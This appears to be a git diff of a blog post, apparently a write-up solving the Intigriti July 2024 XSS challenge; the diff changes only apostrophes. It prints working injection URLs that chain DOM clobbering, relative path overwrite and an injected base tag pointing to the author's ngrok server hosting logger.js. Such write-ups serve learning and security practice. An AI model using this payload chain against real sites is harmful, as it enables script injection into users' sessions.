@@ -17,7 +17,7 @@ I started this July by solving the usual Intigriti challenge, it was a straightf
 
 ### Dynamic Analysis
 
-Let's start by taking a look at the [challenge's website](https://challenge-0724.intigriti.io/challenge/).
+Let’s start by taking a look at the [challenge's website](https://challenge-0724.intigriti.io/challenge/).
 
 ![Challenge Website](/static/images/intigriti-0724/challenge_website.png)
 
@@ -46,11 +46,11 @@ We can see the existence of a CSP blocking our payload and only allowing executi
 
 There is also an interesting variable called **isDevelopment** that seems interesting.
 
-That should be it playing with the website for a bit. Now let's dive into some static analysis.
+That should be it playing with the website for a bit. Now let’s dive into some static analysis.
 
 ### Static Analysis
 
-Let's take a look at the front page source code.
+Let’s take a look at the front page source code.
 
 ```html
 
@@ -123,7 +123,7 @@ Let's take a look at the front page source code.
 </html>
 ```
 
-Reading the source code, we can see **dompurify** being included at the top and everything is done by the front end using JavaScript which redirects to the same page with **memo** parameter with our content after submitting a memo. Let's focus on the important part which treats our memo after submitting it. 
+Reading the source code, we can see **dompurify** being included at the top and everything is done by the front end using JavaScript which redirects to the same page with **memo** parameter with our content after submitting a memo. Let’s focus on the important part which treats our memo after submitting it. 
 
 ```js
   if (sharedMemo) {
@@ -149,9 +149,9 @@ Reading the source code, we can see **dompurify** being included at the top and 
 
 The first 2 lines take the input and inserts it into the DOM. Later, there is a check `origin === "http://localhost"` checking if the current origin is **localhost** or not. If so, it will define the **isDevelopment** variable we've seen in the dynamic analysis part and set it to **true**. All the code below that check will be executed only if **isDevelopment** variable is set to anything beside $0$ or **false**. 
 
-Since it's impossible to set **origin** to **localhost** in this case, we need to figure out how can we initialize the **isDevelopment** variable.
+Since it’s impossible to set **origin** to **localhost** in this case, we need to figure out how can we initialize the **isDevelopment** variable.
 
-Supposing that we had initialized that variable ourselves, we will enter the **try** and **catch** block. The **try** block isn't going to help at all. It's sanitizing our input with **DOMPurify** then inserting it into the DOM. Of course the challenge is not intended to solve by bypassing **DOMPurify** library because it's using the latest version and bypassing it would involve finding a 0day in the library :smiley_cat:. However, the **catch** block is interesting since it's creating a script tag and loading a script called **logger.js** relative to the current URL which as discussed in the dynamic analysis part will be allowed to execute even with the presence of CSP because of the **strict-dynamic** keyword.
+Supposing that we had initialized that variable ourselves, we will enter the **try** and **catch** block. The **try** block isn't going to help at all. It’s sanitizing our input with **DOMPurify** then inserting it into the DOM. Of course the challenge is not intended to solve by bypassing **DOMPurify** library because it’s using the latest version and bypassing it would involve finding a 0day in the library :smiley_cat:. However, the **catch** block is interesting since it’s creating a script tag and loading a script called **logger.js** relative to the current URL which as discussed in the dynamic analysis part will be allowed to execute even with the presence of CSP because of the **strict-dynamic** keyword.
 
 With that being said, and with the challenge's source simplicity, the challenge should be solved following this steps:
 
@@ -162,7 +162,7 @@ With that being said, and with the challenge's source simplicity, the challenge 
 
 ## Solution
 
-Structuring all the pieces found in static and dynamic analysis and having the brainstorm discussed above to solve the challenge, all what's left is to start working on each step to achieve the popup alert.
+Structuring all the pieces found in static and dynamic analysis and having the brainstorm discussed above to solve the challenge, all what’s left is to start working on each step to achieve the popup alert.
 
 ### Initializing global variables with DOM clobbering
 
@@ -176,7 +176,7 @@ You can read more about **DOM Clobbering** in the PortSwigger blog here: [https:
 
 This technique relies on a very old feature known as **named property access** on the **window** object. You can read about it in this documentation: [https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object).
 
-With that being said, if we inject an `<a>` tag with its **id** attribute set to **isDevelopment **like this `<a id="isDevelopment"></a>`, we can clobber that variable making it point to the tag we injected and so its value bypasses the check as said before because it's different from $0$ and **false**. Let's try injecting that payload and take a look at the devTools console. The current URL with our payload is [https://challenge-0724.intigriti.io/challenge/?memo=%3Ca%20id%3D%22isDevelopment%22%3E%3C%2Fa%3E](https://challenge-0724.intigriti.io/challenge/?memo=%3Ca%20id%3D%22isDevelopment%22%3E%3C%2Fa%3E).
+With that being said, if we inject an `<a>` tag with its **id** attribute set to **isDevelopment **like this `<a id="isDevelopment"></a>`, we can clobber that variable making it point to the tag we injected and so its value bypasses the check as said before because it’s different from $0$ and **false**. Let’s try injecting that payload and take a look at the devTools console. The current URL with our payload is [https://challenge-0724.intigriti.io/challenge/?memo=%3Ca%20id%3D%22isDevelopment%22%3E%3C%2Fa%3E](https://challenge-0724.intigriti.io/challenge/?memo=%3Ca%20id%3D%22isDevelopment%22%3E%3C%2Fa%3E).
 
 As expected the reference error saying **isDevelopment** variable is undefined is not shown anymore. Typing `isDevelopment` into the console will return a reference to the anchor tag we injected.
 
@@ -185,11 +185,11 @@ As expected the reference error saying **isDevelopment** variable is undefined i
 < <a id="isDevelopment"></a>
 ```
 
-So far so good. We are now inside the **try** block and its working well so no errors are thrown. We can also take a look at **DOMPurify** source code included by the challenge's page for `throw` statements, as this is the way to throw errors explicitly in JavaScript, maybe one malformed input will trigger an error. I'm not going to dig into this path as this will not help solve the challenge nor is the right way. However, doing so you'll find 5 `throw` statements and if you limit the code to only the part that is going to execute with the default configuration you practically have no way to throw an error. So how are we going to pass to the **catch** block.
+So far so good. We are now inside the **try** block and its working well so no errors are thrown. We can also take a look at **DOMPurify** source code included by the challenge's page for `throw` statements, as this is the way to throw errors explicitly in JavaScript, maybe one malformed input will trigger an error. I’m not going to dig into this path as this will not help solve the challenge nor is the right way. However, doing so you'll find 5 `throw` statements and if you limit the code to only the part that is going to execute with the default configuration you practically have no way to throw an error. So how are we going to pass to the **catch** block.
 
 ### Relative Path Overwrite (RPO)
 
-This technique is quite old and fun. The idea here is what if we can make **dompurify.js** load incorrectly making any reference to it undefined. This will for sure throw an error in the **try** block since it's using **DOMPurify**.
+This technique is quite old and fun. The idea here is what if we can make **dompurify.js** load incorrectly making any reference to it undefined. This will for sure throw an error in the **try** block since it’s using **DOMPurify**.
 
 Let us first take a look at some ways a page could load resources.
 
@@ -232,7 +232,7 @@ So the page loaded:
 - [https://challenge-0724.intigriti.io/challenge/index.html/dompurify.js](https://challenge-0724.intigriti.io/challenge/index.html/dompurify.js)
 - [https://challenge-0724.intigriti.io/challenge/index.html/style.css](https://challenge-0724.intigriti.io/challenge/index.html/style.css)
 
-Eventually, both of the resources loaded this way will return the content of **index.html** and not the content of the real files which are invalid JavaScript and invalid CSS. Let's now browse to [https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E](https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E) to see if the error is thrown and take a look at the console.
+Eventually, both of the resources loaded this way will return the content of **index.html** and not the content of the real files which are invalid JavaScript and invalid CSS. Let’s now browse to [https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E](https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E) to see if the error is thrown and take a look at the console.
 
 ```
 < Failed to find a valid digest in the 'integrity' attribute for resource 'https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/dompurify.js' with computed SHA-256 integrity 'T6qWAApYzyDAbQi4v3DmLdljNB8XAs06eI3hgUUfhRk='. The resource has been blocked.
@@ -245,7 +245,7 @@ Eventually, both of the resources loaded this way will return the content of **i
 
 Of course **dompurify.js** isn't going to load because the calculated SHA-256 hash of **index.html** isn't equal to the hash of the original file. The second error is thrown because **logger.js** was also loaded relatively to **https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/** returning the content of **index.html** which is invalid JavaScript. The last error is thrown because after loading **logger.js** (which loaded **index.html**) the function `logError` was not defined.
 
-What's left now is to change the base as discussed before to our server and host the **logger.js** file with our payload.
+What’s left now is to change the base as discussed before to our server and host the **logger.js** file with our payload.
 
 ### Changing the base URL
 
@@ -253,7 +253,7 @@ To change the base URL what we have to do is simply inject the **base** tag with
 
 Simply launching ngrok to forward http traffic when visiting the link it generated to **localhost:80** with this command `ngrok http 80`. It generated this link [https://a1ab-196-178-176-253.ngrok-free.app](https://a1ab-196-178-176-253.ngrok-free.app). I created **logger.js** file in **/var/www/html/** containing the payload `alert(document.domain)`.
 
-Having done the setup, let's change the base URL to **https://a1ab-196-178-176-253.ngrok-free.app** by adding `<base href="https://a1ab-196-178-176-253.ngrok-free.app">` to the payload. The payload becomes `<a id="isDevelopment"></a><base href="https://a1ab-196-178-176-253.ngrok-free.app">`. Browsing to this link now: [https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E%3Cbase%20href=%22https://a1ab-196-178-176-253.ngrok-free.app%22%3E](https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E%3Cbase%20href=%22https://a1ab-196-178-176-253.ngrok-free.app%22%3E). Finally, the alert is popped :smile:.​
+Having done the setup, let’s change the base URL to **https://a1ab-196-178-176-253.ngrok-free.app** by adding `<base href="https://a1ab-196-178-176-253.ngrok-free.app">` to the payload. The payload becomes `<a id="isDevelopment"></a><base href="https://a1ab-196-178-176-253.ngrok-free.app">`. Browsing to this link now: [https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E%3Cbase%20href=%22https://a1ab-196-178-176-253.ngrok-free.app%22%3E](https://challenge-0724.intigriti.io/challenge/index.html/anythingInHere/?memo=%3Ca%20id=%22isDevelopment%22%3E%3C/a%3E%3Cbase%20href=%22https://a1ab-196-178-176-253.ngrok-free.app%22%3E). Finally, the alert is popped :smile:.​
 
 ![Popup alert with document.domain](/static/images/intigriti-0724/alert.png)
 
